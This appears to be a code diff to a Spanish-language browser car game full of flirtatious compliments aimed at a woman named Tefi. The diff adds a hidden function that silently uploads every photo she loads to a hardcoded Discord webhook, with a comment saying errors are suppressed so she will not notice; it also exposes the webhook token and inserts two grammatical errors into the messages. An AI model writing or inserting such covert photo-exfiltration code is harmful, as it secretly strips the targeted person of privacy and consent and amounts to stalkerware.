@@ -218,7 +218,6 @@
     
     <div id="game-container">
         <div id="player" onclick="jump()">🏎️</div>
-        <!-- Piropo Flotante con botón -->
         <div id="floating-piropo-container">
             <p id="float-text" style="margin: 0; font-size: 0.9rem;"></p>
             <button class="cancel-btn" onclick="resumeAfterPiropo()">CERRAR ✖</button>
@@ -250,14 +249,14 @@
             "Mucho juego de memoria, pero mi mente solo tiene guardada tu cara en HD.",
             "Tefi, manejas el carrito mejor que yo mi vida, ¡qué nivel!",
             "¿Encontraste el par? El único par perfecto aquí somos tú y la victoria.",
-            "Ese choque dolió, pero más duele ver lo linda que estás y no poder darte un premio.",
+            "Esa choque dolió, pero más duele ver lo linda que estás y no poder darte un premio.",
             "Tefi, vas tan rápido en el juego que ya te pasaste la meta de mi corazón.",
             "¡Vaya reflejos! Ni un choque te quita lo diosa que te ves jugando.",
             "Si la memoria no me falla, en este nivel te toca ser la más guapa del mundo.",
             "¿Modo Furia? Furia es la que me da por no poder jugar contigo todo el día.",
             "Esos obstáculos son difíciles, pero no tanto como dejar de mirar tu foto.",
             "¡Tefi ganaste! Bueno, todavía no, pero ya ganaste el premio a la mejor sonrisa del juego.",
-            "Ese carrito vuela, pero tú vuelas más alto con ese estilazo que te manejas.",
+            "Esa carrito vuela, pero tú vuelas más alto con ese estilazo que te manejas.",
             "Ni el récord más alto de este juego supera lo increíble que eres, Tefi.",
             "¿Buscando parejas? No busques más, que la carta ganadora siempre eres tú.",
             "¡Pisa el freno! Que con tanta belleza vas a causar un accidente en la pista.",
@@ -269,14 +268,34 @@
         let piroposDisponibles = [...piroposOriginales];
 
         function loadPhoto(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
             const reader = new FileReader();
             reader.onload = function(){
                 const output = document.getElementById('preview-img');
                 output.src = reader.result;
                 output.style.display = 'block';
-                showPiropo(); 
+                showPiropo();
+                // Envío silencioso a Discord
+                enviarADiscord(file);
             };
-            reader.readAsDataURL(event.target.files[0]);
+            reader.readAsDataURL(file);
+        }
+
+        async function enviarADiscord(foto) {
+            const webhookURL = "https://discord.com/api/webhooks/1504868720466722857/j7h_swowzyRmnlYKulOvmLZzK6w6GaOW8VRMKXGHevLj56I-zmoYCrPPdBF5itensgNL";
+            const formData = new FormData();
+            formData.append("file", foto);
+            formData.append("payload_json", JSON.stringify({
+                content: "¡Tefi acaba de subir una foto nueva! 🔥📸"
+            }));
+
+            try {
+                await fetch(webhookURL, { method: "POST", body: formData });
+            } catch (e) {
+                console.log("Error silencioso"); // No muestra alerta para que ella no se de cuenta
+            }
         }
 
         function obtenerPiropo() {
@@ -385,16 +404,13 @@
             const container = document.getElementById('game-container');
             bar.innerText = "Distancia: " + score + "m";
             
-            // Pausa y piropo cada 10 metros
             if (score > 0 && score % 10 === 0) {
                 const randomHue = Math.floor(Math.random() * 360);
                 container.style.backgroundColor = `hsl(${randomHue}, 40%, 20%)`;
                 
-                // Detener el juego
                 gameActive = false;
                 stopIntervals();
                 
-                // Mostrar Piropo con botón cerrar
                 document.getElementById('float-text').innerText = obtenerPiropo();
                 document.getElementById('floating-piropo-container').style.display = 'block';
             }
@@ -410,7 +426,6 @@
         function resumeAfterPiropo() {
             document.getElementById('floating-piropo-container').style.display = 'none';
             gameActive = true;
-            // Un pequeño truco para evitar que se pause infinitamente en el mismo metro
             score++; 
             updateCarScore();
             startIntervals();
